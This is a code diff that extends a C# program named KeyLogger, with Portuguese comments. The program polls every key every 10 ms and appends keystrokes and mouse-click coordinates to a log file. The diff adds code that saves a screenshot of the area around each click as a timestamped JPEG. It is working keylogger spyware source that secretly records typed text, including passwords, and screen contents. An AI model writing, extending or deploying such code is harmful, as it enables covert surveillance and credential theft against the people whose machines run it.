@@ -2,11 +2,14 @@
 // ReSharper disable HeapView.ObjectAllocation.Evident
 // ReSharper disable HeapView.ObjectAllocation.Possible
 // ReSharper disable ObjectCreationAsStatement
+// ReSharper disable HeapView.BoxingAllocation
 
 using System;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Reflection;
+using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
@@ -38,8 +41,8 @@ namespace KeyLogger
         /// <summary>
         /// Nome do arquivo que armazena o log.
         /// </summary>
-        private static string _filename = Assembly.GetExecutingAssembly().Location + ".log";
-        
+        private static readonly string Filename = Assembly.GetExecutingAssembly().Location + ".log";
+
         /// <summary>
         /// Ponto de entrada da execução do programa.
         /// </summary>
@@ -51,9 +54,17 @@ namespace KeyLogger
                 foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
                 {
                     if (GetAsyncKeyState(key) != -32767) continue;
-                    var keyName = GetKeyName(key);
-                    File.AppendAllText(_filename, keyName);
+                    var keyName = GetKeyName(key, true);
                     Console.Write(keyName);
+                    try
+                    {
+                        File.AppendAllText(Filename, keyName);
+                    }
+                    catch (Exception ex)
+                    {
+                        // Ignora se não conseguir escrever no arquivo.
+                        Console.WriteLine("ERROR: {0}", ex);
+                    }
                 }
             }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
             
@@ -64,9 +75,11 @@ namespace KeyLogger
         /// Obtem o nome ou descrição de uma tecla.
         /// </summary>
         /// <param name="key">Tecla.</param>
+        /// <param name="printScreenIfMouseAction">Captura a tela se for uma ação de mouse.</param>
         /// <returns>Nome ou descrição.</returns>
-        private static string GetKeyName(Keys key)
+        private static string GetKeyName(Keys key, bool printScreenIfMouseAction = false)
         {
+            // ReSharper disable once SwitchStatementMissingSomeCases
             switch (key)
             {
                 case Keys.Space: return " ";
@@ -77,15 +90,47 @@ namespace KeyLogger
                     
                     if (name.Length == 1) return name.ToLower();
 
+                    // ReSharper disable once InvertIf
                     if (name.Contains("Button"))
                     {
                         GetCursorPos(out var mouse);
-                        return $"[{name} X:{mouse.X} Y:{mouse.Y}]";
+                        var printScreen = printScreenIfMouseAction ? PrintScreen(mouse) : string.Empty;
+                        return $"[{name} X:{mouse.X} Y:{mouse.Y} {printScreen}]".Trim();
                     }
 
                     return $"[{name}]";
                 }
             }
-        } 
+        }
+
+        /// <summary>
+        /// Captura a tela na posição indicada.
+        /// </summary>
+        /// <param name="center">Posição central.</param>
+        /// <param name="radius">Raio da área capturada. Embora seja retangular.</param>
+        private static string PrintScreen(Point center, int radius = 100)
+        {
+            try
+            {
+                using (var bitmap = new Bitmap(radius, radius))
+                {
+                    using (var graphics = Graphics.FromImage(bitmap))
+                    {
+                        graphics.CopyFromScreen(new Point(center.X - radius / 2, center.Y - radius / 2), Point.Empty,
+                            new Size(radius, radius));
+                    }
+
+                    var file = new FileInfo($"{Filename}.{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.jpg");
+                    bitmap.Save(file.FullName, ImageFormat.Jpeg);
+                    return file.Name;
+                }
+            }
+            catch (Exception ex)
+            {
+                // Ignora se não conseguir capturar a tela.
+                Console.WriteLine("ERROR: {0}", ex);
+                return string.Empty;
+            }
+        }
     }
 }
